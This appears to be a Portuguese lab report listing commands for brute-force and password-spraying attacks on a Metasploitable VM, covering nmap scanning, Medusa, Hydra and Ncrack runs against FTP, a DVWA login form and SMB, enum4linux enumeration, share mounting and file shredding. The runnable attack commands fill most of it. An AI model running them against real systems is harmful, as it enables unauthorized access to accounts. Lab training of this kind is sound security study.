# Relatório Técnico: Comandos Utilizados em Ataques de Força Bruta

## 📋 Índice
1. [Configuração e Reconhecimento do Ambiente](#configuração-e-reconhecimento-do-ambiente)
2. [Ataque de Força Bruta em FTP](#ataque-de-força-bruta-em-ftp)
3. [Ataque em Aplicação Web (DVWA)](#ataque-em-aplicação-web-dvwa)
4. [Enumeração e Ataque SMB](#enumeração-e-ataque-smb)
5. [Comandos de Validação e Exploração](#comandos-de-validação-e-exploração)

---

## 🔍 Configuração e Reconhecimento do Ambiente

### 1. Verificação da Configuração de Rede
```bash
# Verificar interfaces de rede no Kali Linux
ip addr show
ip route show

# Testar conectividade com o Metasploitable
ping -c 3 192.168.56.101

# Verificar se a VM está respondendo
arp -a
```

### 2. Escaneamento de Portas e Serviços
```bash
# Scan básico para descobrir hosts ativos
nmap -sn 192.168.56.0/24

# Scan completo de portas no Metasploitable
nmap -p- 192.168.56.101

# Scan detalhado das portas principais com versão de serviços
nmap -sV -p 21,22,80,445,139,111,3306,5432 192.168.56.101

# Scan com detecção de SO e scripts padrão
nmap -A -T4 192.168.56.101

# Scan específico para vulnerabilidades comuns
nmap --script vuln 192.168.56.101
```

**Resultados Esperados:**
```
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00047s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
```

---

## 🗂️ Ataque de Força Bruta em FTP

### 1. Criação de Wordlists
```bash
# Criar lista de usuários comuns
echo -e 'msfadmin\nadmin\nroot\nuser\ntest\nftp\nanonymous' > users_ftp.txt

# Criar lista de senhas comuns
echo -e 'msfadmin\n123456\npassword\nadmin\nadmin123\nqwerty\nletmein\nftp' > pass_ftp.txt

# Verificar conteúdo dos arquivos
cat users_ftp.txt
cat pass_ftp.txt

# Contar linhas das wordlists
wc -l users_ftp.txt pass_ftp.txt
```

### 2. Teste Manual de FTP
```bash
# Conexão manual para validar serviço
ftp 192.168.56.101

# No prompt do FTP tentar credenciais manualmente
# Username: msfadmin
# Password: msfadmin

# Comandos FTP após login bem-sucedido
ls
pwd
quit
```

### 3. Ataque com Medusa no FTP
```bash
# Ataque básico com usuário e lista de senhas
medusa -h 192.168.56.101 -u msfadmin -P pass_ftp.txt -M ftp

# Ataque com lista de usuários e lista de senhas
medusa -h 192.168.56.101 -U users_ftp.txt -P pass_ftp.txt -M ftp

# Ataque com múltiplas threads e parada no primeiro sucesso
medusa -h 192.168.56.101 -U users_ftp.txt -P pass_ftp.txt -M ftp -t 6 -f

# Ataque com timeout personalizado e verbose
medusa -h 192.168.56.101 -U users_ftp.txt -P pass_ftp.txt -M ftp -t 4 -f -v 6

# Salvar resultados em arquivo
medusa -h 192.168.56.101 -U users_ftp.txt -P pass_ftp.txt -M ftp -t 6 -f -O ftp_results.txt
```

### 4. Comandos Alternativos para FTP
```bash
# Usando Hydra como alternativa
hydra -L users_ftp.txt -P pass_ftp.txt ftp://192.168.56.101

# Usando Ncrack
ncrack -U users_ftp.txt -P pass_ftp.txt ftp://192.168.56.101
```

---

## 🌐 Ataque em Aplicação Web (DVWA)

### 1. Reconhecimento do DVWA
```bash
# Acessar via navegador ou curl
curl -I http://192.168.56.101/dvwa/

# Verificar se a página de login está acessível
curl http://192.168.56.101/dvwa/login.php | head -20

# Identificar parâmetros do formulário
curl -s http://192.168.56.101/dvwa/login.php | grep -E 'name=|method='
```

### 2. Criação de Wordlists para Web
```bash
# Usuários comuns para web
echo -e 'admin\nadministrator\nroot\nuser\ntest\nguest' > users_web.txt

# Senhas comuns para web
echo -e 'password\n123456\nadmin\nletmein\nqwerty\nabc123' > pass_web.txt

# Combinar credenciais conhecidas do DVWA
echo -e 'admin\npablo\n1337\ngordonb\nsmithy' > dvwa_users.txt
echo -e 'password\nletmein\ncharley\nabc123\npassword' > dvwa_pass.txt
```

### 3. Ataque com Medusa no DVWA
```bash
# Ataque básico ao formulário de login
medusa -h 192.168.56.101 -U users_web.txt -P pass_web.txt -M http \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login"

# Ataque com threads e parada no sucesso
medusa -h 192.168.56.101 -U dvwa_users.txt -P dvwa_pass.txt -M http \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login" \
  -t 6 -f

# Ataque verbose para debugging
medusa -h 192.168.56.101 -u admin -P pass_web.txt -M http \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=^USER^&password=^PASS^&Login=Login" \
  -v 6
```

## 💻 Enumeração e Ataque SMB

### 1. Enumeração de Usuários SMB
```bash
# Enumeração básica com enum4linux
enum4linux -a 192.168.56.101

# Salvar output para análise
enum4linux -a 192.168.56.101 | tee enum4_output.txt

# Filtrar informações específicas
grep -i "user" enum4_output.txt
grep -i "account" enum4_output.txt

# Enumeração com rpcclient
rpcclient -U "" -N 192.168.56.101
# Comandos dentro do rpcclient:
# > enumdomusers
# > quit

# Scan SMB com nmap scripts
nmap --script smb-enum-users 192.168.56.101
nmap --script smb-os-discovery 192.168.56.101
```

### 2. Criação de Wordlists para SMB
```bash
# Extrair usuários do enum4linux
grep "Local User" enum4_output.txt | awk '{print $4}' | grep -v "nobody" > smb_users.txt

# Adicionar usuários comuns do Windows/Samba
echo -e 'administrator\nguest\nftp\nwww-data\nmysql\nbackup' >> smb_users.txt

# Criar lista de senhas para spraying
echo -e 'password\n123456\nadmin\n1234\n12345\nqwerty' > smb_pass.txt

# Verificar listas finais
cat smb_users.txt
cat smb_pass.txt
```

### 3. Ataque de Password Spraying SMB
```bash
# Ataque básico com Medusa
medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt

# Ataque com menos threads para stealth
medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2

# Ataque com timeout aumentado
medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2 -T 50

# Ataque focado em usuários específicos
medusa -h 192.168.56.101 -u msfadmin -P smb_pass.txt -M smbnt -f
```

### 4. Validação de Acesso SMB
```bash
# Listar shares com credenciais descobertas
smbclient -L //192.168.56.101 -U msfadmin

# Acessar share específico
smbclient //192.168.56.101/tmp -U msfadmin

# Comandos dentro do smbclient:
# > ls
# > get arquivo.txt
# > put arquivo_local.txt
# > exit

# Montar share SMB localmente
mkdir /mnt/smb_share
mount -t cifs //192.168.56.101/tmp /mnt/smb_share -o username=msfadmin,password=msfadmin
```

---

## ✅ Comandos de Validação e Exploração

### 1. Validação de Credenciais Descobertas
```bash
# Testar FTP com credenciais descobertas
ftp -n 192.168.56.101 << EOF
user msfadmin msfadmin
ls
quit
EOF

# Testar SSH com credenciais
ssh msfadmin@192.168.56.101 "whoami && hostname"

# Testar SMB com credenciais
smbclient -L //192.168.56.101 -U msfadmin%msfadmin
```

### 2. Coleta de Evidências
```bash
# Salvar logs de atividades
history | grep -E "medusa|hydra|nmap|enum4linux" > commands_used.txt

# Capturar screenshots (se usando interface gráfica)
import -window root screenshot_$(date +%Y%m%d_%H%M%S).png

# Criar resumo dos resultados
echo "=== RESUMO DOS RESULTADOS ===" > summary.txt
echo "FTP: msfadmin/msfadmin" >> summary.txt
echo "SSH: msfadmin/msfadmin" >> summary.txt
echo "SMB: msfadmin/msfadmin" >> summary.txt
date >> summary.txt
```

### 3. Limpeza
```bash
# Remover arquivos temporários sensíveis
shred -zu users_*.txt pass_*.txt 2>/dev/null
```

---

## 📊 Exemplo de Output de Sucesso

```
MEDUSA RESULTADO FTP:
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

MEDUSA RESULTADO DVWA:
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]

MEDUSA RESULTADO SMB:
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

---

### `Medusa`: Comandos Principais 

| Parâmetro | Descrição | Exemplo |
|-----------|-----------|---------|
| `-h` | Host alvo | `-h 192.168.56.101` |
| `-u` | Usuário único | `-u admin` |
| `-U` | Lista de usuários | `-U userlist.txt` |
| `-p` | Senha única | `-p password123` |
| `-P` | Lista de senhas | `-P wordlist.txt` |
| `-M` | Módulo do serviço | `-M ftp` |
| `-t` | Threads | `-t 4` |
| `-f` | Parar no primeiro sucesso | `-f` |

---

**⚠️ Nota de Segurança**: Todos os comandos foram executados em ambiente controlado para fins educacionais. Em ambientes de produção, garantir autorização explícita antes de realizar qualquer teste de segurança.
